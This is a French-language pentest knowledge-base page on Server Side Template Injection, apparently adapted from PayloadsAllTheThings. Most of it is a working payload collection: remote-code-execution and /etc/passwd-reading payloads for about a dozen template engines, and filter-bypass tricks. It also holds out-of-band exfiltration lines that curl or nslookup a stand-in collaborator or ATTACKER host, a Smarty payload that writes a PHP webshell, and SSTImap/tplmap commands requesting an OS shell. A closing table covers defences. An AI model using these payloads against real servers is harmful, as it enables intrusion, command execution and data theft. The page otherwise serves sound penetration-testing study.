---
title: "SSTI"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# SSTI — Server Side Template Injection

> [!info] **En 1 phrase**
> SSTI = injecter des **balises et expressions de template** dans une entrée utilisateur
> que le serveur rend **à travers un moteur de template** → évaluation de code arbitraire
> côté serveur, souvent jusqu'à **RCE**.
>
> Source principale : **[PayloadsAllTheThings (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)**

---

## Concept

```mermaid
flowchart LR
    A[Entrée utilisateur<br>nom, email, préview de template...] --> B[Template assemblé<br>côté serveur]
    B --> C[Expression injectée<br>exécutée par le moteur]
    C --> D{Résultat rendu ?}
    D -->|7*7 → 49| E[SSTI confirmée]
    E --> F[Identifier le moteur<br>Jinja2 / Twig / Smarty / Freemarker...]
    F --> G[Payload spécifique moteur]
    G --> H[RCE / lecture fichiers / rev shell]
    D -->|Affiché tel quel| I[Simple interpolation<br>échappée → pas de SSTI]
```

> [!info] **Pourquoi ça marche**
> Un moteur de template (Jinja2, Twig, Freemarker…) évalue les expressions entre balises
> (`{{ }}`, `${ }`, `<% %>`...). Si l'entrée utilisateur est **concatenée dans le template
> puis rendue** sans échappement, on insère nos propres expressions → le serveur exécute
> notre code. Un template = **du code serveur déguisé en HTML**.

---

## Détection

> [!tip] **Où chercher ?** Les fonctionnalités qui génèrent des **PDF, factures, emails,
> prévisualisations, CV, rapports** utilisent presque toujours un template. Cibles de choix.

### Tags à tester (toutes les syntaxes)

```bash
{{ ... }}        ${ ... }        #{ ... }        <%= ... %>        { ... }
{{= ... }}       {= ... }        \n= ... \n      *{ ... }          @{ ... }   @( ... )
```

### 1. Test mathématique (Rendered)

```bash
# Remplacez la valeur par une expression, dans chaque type de balise
{{7*7}}          # → 49 (rendu) = SSTI
${7*7}
<%= 7*7 %>
#{7*7}
# Si la réponse contient "49" → le moteur évalue nos expressions
```

> [!warning] Interpolation ≠ injection : si `{{7*7}}` reste **littéralement** `{{7*7}}`
> dans la réponse, l'entrée est échappée ou jamais interprétée → pas de SSTI exploitable.

### 2. Polyglot d'erreur (Error-Based)

```bash
# Déclenche une erreur dans presque tous les moteurs
${{<%[%'"}}%\.
# → erreur verbeuse (stacktrace) = SSTI probable + identification du langage

# Payload d'erreur ciblé
(1/0).zxy.zxy
```

| Erreur affichée | Langage |
|---|---|
| `ZeroDivisionError` | Python |
| `java.lang.ArithmeticException` | Java |
| `ReferenceError` / `TypeError` | NodeJS |
| `Division by zero` / `DivisionByZeroError` | PHP |
| `divided by 0` | Ruby |
| `Arithmetic operation failed` | Freemarker (Java) |

### 3. Blind (Boolean-Based)

> Tester des paires de payloads, l'une valide, l'autre en erreur de syntaxe.
> **Toujours ≥ 2 paires** pour éviter les faux positifs (interférences externes).

| Test | OK | Erreur |
|---|---|---|
| 1 | `(3*4/2)` | `3*)2(/4` |
| 2 | `((7*8)/(2*4))` | `7)(*)8)(2/(*4` |

---

## Identification du moteur

> [!tip] **Discriminateur rapide** : la multiplication chaîne/int.

| Payload | Résultat | Moteur |
|---|---|---|
| `{{7*'7'}}` | `7777777` (str × int) | **Jinja2** (Python) |
| `{{7*'7'}}` | `49` (cast int) | **Twig** (PHP) |
| `<%= 7*7 %>` | `49` | **ERB** (Ruby) |
| `${7*7}` | `49` | **Freemarker / Mako / Genshi** |
| `#set($x=7*7)$x` | `49` | **Velocity** (Java) |
| `[[${7*7}]]` | `49` | **Thymeleaf** (Java) |
| `#{7*7}` | `49` | **Jade/Pug** (Node) |
| `{{7*7}}` | `49` | **Go text/template** |
| `{{7*7}}` | `7*7` littéral | **Handlebars/Mustache** (pas d'éval !) |

**Familles par langage** : Python (Jinja2, Django, Mako, Genshi), Java (Freemarker,
Velocity, Thymeleaf, Pebble), Ruby (ERB, Slim), PHP (Twig, Smarty, Blade), Node (Jade/Pug,
Handlebars, Nunjucks, EJS), Go (text/template, html/template).

---

## Jinja2 (Python)

```jinja2
{# Fuite de configuration #}
{{config}}
{{config.DEBUG}}
{{self.__init__.__globals__.__builtins__}}

{# Détection #}
{{7*7}}                # → 49
{{7*'7'}}              # → 7777777

{# RCE — cycler (le classique) #}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}

{# Variantes #}
{{lipsum.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

{# Via request (Flask) #}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request.__class__.__mro__[1].__subclasses__()}}     # lister les classes chargées

{# Lecture de fichier via sous-classes #}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
# index 137 (varie selon l'app) → chercher la classe contenant __builtins__

{# Version + builtins #}
{{config.__class__.__init__.__globals__}}
```

---

## Twig (PHP)

```twig
{{7*7}}                # → 49
{{7*'7'}}              # → 49 (cast en int — discriminant vs Jinja2)

{# RCE historique (Twig <= 1.x) #}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

{# RCE moderne (Twig 2/3) — filter #}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('shell_exec')}}

{# Variantes map / sort / reduce #}
{{['id']|map('system')}}
{{['id']|sort('system')}}
{{['id']|reduce('system')}}
{{{'id'}|filter('system')}}        # ancienne syntaxe

{# Si "system" est filtré : autre fonction PHP #}
{{['id']|filter('passthru')}}
{{['id']|filter('exec')}}
{{['id']|filter('shell_exec')}}
```

> [!warning] `_self.env...` ne fonctionne **plus sur Twig 2/3** (propriété `env` supprimée).
> Toujours tester les deux familles de payloads.

---

## Smarty (PHP)

```smarty
{$smarty.version}                            # version du moteur
{$smarty.template_object->smarty->disableSecurity()}    # désactiver la sandbox

{# RCE : tags PHP (supprimé depuis Smarty 3.1) #}
{php}system('id');{/php}

{# RCE : appel de fonction (si la sécurité est désactivée) #}
{system('id')}
{'id'|system}

{# Écriture de fichier → webshell #}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}

{# Fuite de configuration / politique #}
{$smarty.template_object->smarty->security_policy}
{$smarty.template_object->smarty->trusted_dir}
{$smarty.template_object->smarty->php_handling}
```

---

## Freemarker (Java)

```freemarker
${7*7}                                   # → 49

{# RCE : classe utilitaire Execute #}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.Execute"?new()>${value("whoami")}

{# RCE : ObjectConstructor (ProcessBuilder) #}
<#assign w="freemarker.template.utility.ObjectConstructor"?new()>
${w("java.lang.ProcessBuilder","/bin/bash","-c","id").start()}

{# RCE : Jython (si présent) #}
<#assign value="freemarker.template.utility.JythonRuntime"?new()>${value("import os; os.system('id')")}

{# Divers #}
${.now}                                  # date → confirme l'évaluation
${.version}
```

---

## Velocity (Java)

```velocity
#set($x=7*7)${x}                         # → 49

#set($x="")
#set($rt=$x.class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()

#set($e="x")
#set($re=$e.class.forName("java.lang.Runtime").getRuntime().exec("id"))
$re.waitFor()

# ProcessBuilder
#set($p=$e.class.forName("java.lang.ProcessBuilder"))
#set($pb=$p.newInstance("id"))
$pb.start()
```

---

## ERB (Ruby)

```erb
<%= 7*7 %>                               # → 49
<%= 7*7 %><br>                           # <% %> exécute, <%= %> exécute + affiche

<%= system("id") %>                      # sortie + code retour
<%= `id` %>                              # backticks → sortie capturée
<%= IO.popen("id").read %>               # sortie propre
<%= File.read('/etc/passwd') %>          # lecture de fichier
<%= require 'net/http' %>                # modules Ruby
```

---

## Thymeleaf (Java)

```thymeleaf
[[${7*7}]]                               # → 49 (inline)
<div th:text="${7*7}"></div>             # attribut
${7*7}                                   # expression Spring EL

# RCE via opérateur T() (SpEL)
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
${T(java.lang.Runtime).getRuntime().exec('curl http://ATTACKER/' + ...)}
```

---

## Pebble (Java)

```pebble
{{7*7}}                                  # → 49
{{7*'7'}}                                # → 49

# RCE (selon la version et la sandbox)
{{'foo'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}
{{''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami')}}
```

---

## Handlebars / Mustache

```handlebars
# Mustache = "logic-less" : {{7*7}} reste littéral → AUCUNE évaluation par défaut.
# Handlebars (Node) : même chose en SSTI classique.
# MAIS : si l'app charge Handlebars avec des helpers débridés → CSTI / RCE
# (prototype pollution, ex: --allow-proto-constructor-pollution)

# RCE CSTI (helper "lookup" + constructeur Function) — exemple condensé :
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}{{this.push (lookup string.sub "constructor")}}
      {{this.pop}}{{#with string.split as |codelist|}}
        {{this.pop}}{{this.push "return process.env"}}
        {{#with string.split}}
          {{this.pop}}{{this.push (lookup codelist "constructor")}}
          {{#with this}}
            {{#with (lookup string.sub "constructor")}}
              {{this.apply 0 codelist}}
            {{/with}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Jade / Pug (Node)

```pug
#{(7*7)}                                 # → 49 (Jade)
= 7*7                                    # expression JS
- var x = 7*7
= x

# RCE
=global.process.mainModule.require('child_process').execSync('id').toString()
#(global.process.mainModule.require('child_process').execSync('id').toString())
- global.process.mainModule.require('child_process').execSync('id')
```

---

## Go template

```go
// text/template : les expressions arithmétiques sont évaluées
{{7*7}}                // → 49
{{printf "%s" "SSTI"}}
{{.}}                  // dump du contexte (fuite d'info)
{{.Field}}             // accès aux champs
{{range .}}{{.}}{{end}}

// RCE UNIQUEMENT si l'app a enregistré des fonctions dangereuses dans FuncMap :
{{"id" | exec}}        // si la fonction "exec" existe
{{"whoami" | shell}}
```

---

## Mako (Python) & Genshi (Python)

```python
# Mako
${7*7}                                       # → 49
${__import__('os').popen('id').read()}       # RCE directe (pas de sandbox par défaut)
${self.module.cache.util.os.system('id')}    # variante via le module cache
${open('/etc/passwd').read()}                # lecture de fichier

# Genshi
${7*7}                                       # → 49
#{7*7}                                       # variante
<?python import os; os.system('id') ?>       # directive python (RCE)
<?python print(open('/etc/passwd').read()) ?>
```

---

## Bypass de filtres (Jinja2 en priorité)

```jinja2
{# Underscores bloqués : utiliser |attr() au lieu de l'accès direct #}
{{()|attr('__class__')}}
{{lipsum|attr('__globals__')}}
{{()|attr('\x5f\x5fclass\x5f\x5f')}}        # \x5f = _ (hex)
{{()|attr('\137\137class\137\137')}}        # \137 = _ (octal)

{# Quotes bloquées : passer les clés en paramètre GET via request.args #}
{{cycler.__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}
# &os=os&cmd=id   (Flask : request.args = les params de l'URL)
{{lipsum|attr(request.args.f)}}?f=__globals__
{{config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()}}&a=os&b=id

{# Concaténation pour reconstruire les mots-clés bloqués (os, cat...) #}
{{lipsum.__globals__['o'+'s'].popen('i'+'d').read()}}
{{lipsum.__globals__['\x6f\x73'].popen('id').read()}}    # "os" en hex
{{lipsum.__globals__[request.args.os]}}                  # via GET, le plus propre

{# Points ou [ ] bloqués #}
{{config['__class__']}}                      # [ ] remplace le point
{{()|attr('__class__')}}                     # ou l'inverse
{{cycler.__init__.__globals__.pop('os').popen('id').read()}}   # pop() au lieu de [ ]

{# {{ }} bloquées : autres blocs Jinja2 #}
{% print(7*7) %}
{% set a = 7*7 %}{{a}}
{% if 7*7 == 49 %}yes{% endif %}
# En URL : encoder %7b%7b ... %7d%7d (double encodage si WAF)
```

> [!warning] **Filtre `os` / `popen`** : testez systématiquement `request.args.<var>`
> avant d'attaquer les bypass d'underscore — c'est de loin le plus propre et le plus fiable.
> Sur les environnements sans `request` (hors Flask), priorité aux concaténations `'o'+'s'`
> et à l'encodage hex/octal.

---

## Polyglots

```bash
# Polyglot d'erreur universel (source PayloadsAllTheThings)
${{<%[%'"}}%\.
# → déclenche une erreur dans la plupart des moteurs → confirme le SSTI

# Polyglot mathématique à tester sous toutes les balises
{{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}  [[${7*7}]]
```

> [!tip] La **Hackmanit Template Injection Table** répertorie les polyglots et leurs
> réponses attendues pour **44 moteurs de templates** → identification automatique du moteur
> d'après la transformation du payload.
> `https://github.com/Hackmanit/template-injection-table`

---

## Blind SSTI

```bash
# Time-Based : forcer un délai via la commande (si RCE probable)
# Jinja2
{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}
{{lipsum.__globals__['os'].system('sleep 5')}}
# Twig
{{['sleep 5']|filter('system')}}
# Freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}

# Boolean-Based : comparer des paires valide/erreur (voir section Détection)
(3*4/2)     → réponse normale
3*)2(/4     → réponse différente/erreur → injectable

# Out-of-Band (OAST) : exfiltration par HTTP/DNS vers Collaborator/interactsh
# Jinja2
{{lipsum.__globals__['os'].system('curl http://BURP-COLLABORATOR/$(id)')}}
{{cycler.__init__.__globals__.os.popen('nslookup BURP-COLLABORATOR').read()}}
# Twig
{{['nslookup BURP-COLLABORATOR']|filter('system')}}
```

---

## Outils

```bash
# TInjA (Hackmanit) — scanner SSTI + CSTI avec polyglots avancés
tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
tinja url -u "http://example.com/" -d "username=Kirlia" -c "PHPSESSID=ABC123..."

# tplmap (Python 2) — ancêtre, encore utile en interne
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade

# SSTImap (Python 3, fork interactif de tplmap) — à privilégier
python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'

# Burp Suite — manuel :
# Repeater : tester les tags un par un, comparer les réponses (49 vs littéral)
# Intruder : liste de toutes les balises + erreurs → identification
# Comparer rendu, timing et code HTTP entre requêtes paires (blind)
```

> [!tip] Le wildcard `*` dans l'URL (`name=John*`) marque le point d'injection
> pour tplmap/SSTImap — il **doit** être remplacé par notre payload.

---

## Détection & Défense

| Réponse | Détail |
|---|---|
| **Ne jamais laisser l'utilisateur définir/uploader un template** | La cause #1. Un template = **code**, pas des données. Séparer templates fixes et entrées utilisateur. |
| **Sandboxing** | `jinja2.sandbox.SandboxedEnvironment`, Twig `SandboxExtension` + policy, Pebble sandbox, Freemarker `TemplateClassResolver` restrictif |
| **Échappement systématique** | `autoescape` ON, échapper tout contenu rendu ; ne jamais passer de HTML utilisateur à `render()` |
| **Moteur "logic-less"** | Mustache / Handlebars sans helpers = aucune expression évaluée par défaut → surface d'attaque quasi nulle |
| **Masquer les erreurs** | Stacktraces verbeuses = identification gratuite du moteur + langage. Logs d'erreurs seulement. |
| **Moindre privilège** | Le compte applicatif ne doit pas pouvoir exécuter de commandes (systemd Hardening, containers, SELinux) |
| **WAF** | Signatures SSTI basiques (regex de `{{ }}`), contournables (encodage, concaténation, attributs) — bouchon, pas pare-feu |
| **Mises à jour moteurs** | Versions anciennes = bypass RCE publics (Twig 1.x, Smarty < 3.1, Jinja2 non sandboxed) |
| **Validation d'entrée** | Allowlist stricte sur les champs rendus par un template (nom, email…), taille, caractères |

---

## Tips & Pièges

> [!tip] **Ordre logique d'attaque**
> 1. **Math** : `{{7*7}}` → rendu = injectable.
> 2. **Déterminer le moteur** : `{{7*'7'}}` (Jinja2=`7777777` / Twig=`49`), erreurs, version.
> 3. **RCE spécifique au moteur** (voir sections ci-dessus).
> 4. Si pas de sortie : **blind** (time / boolean / OOB) puis reverse shell.

> [!warning] **Pièges**
> - **Interpolation simple ≠ SSTI** : si `{{7*7}}` reste littéral, l'entrée est échappée ou jamais interprétée — chercher un autre point d'injection.
> - **Version du moteur = tout** : Twig 1.x `_self.env` ≠ Twig 2/3 (`|filter('system')`) ; Smarty `{php}` supprimé en 3.1 ; Jinja2 sandboxed retire `cycler`/`lipsum` → repli sur `config`, `request`, `self`, `namespace`.
> - `{{7*'7'}}` : Jinja2 → `7777777` (str×int), Twig → `49` (cast int). Le meilleur discriminateur rapide.
> - **Handlebars/Mustache n'évaluent pas** → souvent une fausse alerte ; c'est du CSTI (client) qu'il faut chercher, ou une version avec helpers exposés.
> - **PDF / emails / factures = templates** : ne pas les oublier dans le scope.
> - Les payloads doivent être **URL-encodées** (voire double-encodées) selon le contexte ; testez aussi le HTML entity encoding des sorties.
> - Go : pas de RCE natif en template — uniquement si des fonctions sont injectées dans le `FuncMap`.

---

## Liens

- [[Injection SQL| SQLi]]
- [[Injection de commandes| Injection de commandes]]
- [[XSS (Cross-Site Scripting)| XSS]]
- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
- Source : [PayloadsAllTheThings — Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- Paper de référence : [Server-Side Template Injection: RCE For The Modern Web App — James Kettle](https://portswigger.net/knowledgebase/papers/serversidetemplateinjection.pdf)
